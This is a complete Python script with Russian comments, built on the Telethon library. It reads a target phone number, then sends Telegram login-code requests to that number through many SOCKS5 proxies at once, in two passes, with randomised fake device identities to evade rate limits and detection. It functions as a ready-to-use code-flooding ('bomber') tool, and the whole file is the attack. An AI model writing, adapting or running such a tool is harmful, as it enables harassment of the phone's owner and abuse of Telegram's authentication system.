import asyncio,socks
from telethon import TelegramClient,errors
from telethon.sessions import StringSession
from pars2 import getproxy_cached
from random import randint
pr=getproxy_cached()
API_ID=00000000     # возмите с my.telegram.org
API_HASH='abcdefgr' # и это
CONCURRENCY=50
OP_TIMEOUT=8
CONNECT_RETRIES=1
def make_client_for_proxy(proxy_tuple):
	z=randint(1,3)
	if z==1:device_model,system_version,app_version='Pixel 7','Android 14','9.0.0'
	elif z==2:device_model,system_version,app_version='HP Pavilion P9','Windows 11','3.2.0'
	else:device_model,system_version,app_version='Ipad Air 12','IOS 13','9.12.3'
	session=StringSession();client=TelegramClient(session=session,api_id=API_ID,api_hash=API_HASH,proxy=proxy_tuple,device_model=device_model,system_version=system_version,app_version=app_version,lang_code='ru',system_lang_code='ru-RU',connection_retries=CONNECT_RETRIES,retry_delay=0,request_retries=1,timeout=OP_TIMEOUT,use_ipv6=False);return client
async def try_proxy(q,phone,sem:asyncio.Semaphore,timeout:int):
	ip=q.get('ip');port_s=q.get('port')or''
	try:port=int(port_s)
	except(ValueError,TypeError):return{'proxy':f"{ip}:{port_s}",'ok':False,'reason':'bad_port'}
	proxy_tuple=socks.SOCKS5,ip,port
	async with sem:
		client=make_client_for_proxy(proxy_tuple)
		try:await asyncio.wait_for(client.connect(),timeout=timeout)
		except Exception:await safe_disconnect(client);return{'proxy':f"{ip}:{port}",'ok':False,'reason':'connect_err'}
		try:await asyncio.wait_for(client.send_code_request(phone),timeout=timeout);return{'proxy':f"{ip}:{port}",'ok':True}
		except(asyncio.TimeoutError,errors.RPCError,Exception):return{'proxy':f"{ip}:{port}",'ok':False,'reason':'send_err'}
		finally:await safe_disconnect(client)
async def safe_disconnect(client):
	try:
		if client and not client.is_disconnected():await client.disconnect()
	except Exception:pass
async def run_pass(proxy_list,phone,concurrency,timeout):sem=asyncio.Semaphore(concurrency);tasks=[asyncio.create_task(try_proxy(q,phone,sem,timeout))for q in proxy_list];results=await asyncio.gather(*tasks,return_exceptions=False);return results
async def main():
	if not pr:print('0:0');return
	initial_total=len(pr);phone=input('номер: ').strip();results1=await run_pass(pr,phone,CONCURRENCY,OP_TIMEOUT);cleaned=[p for(p,r)in zip(pr,results1)if isinstance(r,dict)and r.get('ok')]
	if not cleaned:print(f"0:{initial_total}");return
	results2=await run_pass(cleaned,phone,CONCURRENCY,OP_TIMEOUT);success_after_second=sum(1 for r in results2 if isinstance(r,dict)and r.get('ok'));failures=initial_total-success_after_second;print(f"{success_after_second}:{failures}")
if __name__=='__main__':asyncio.run(main())
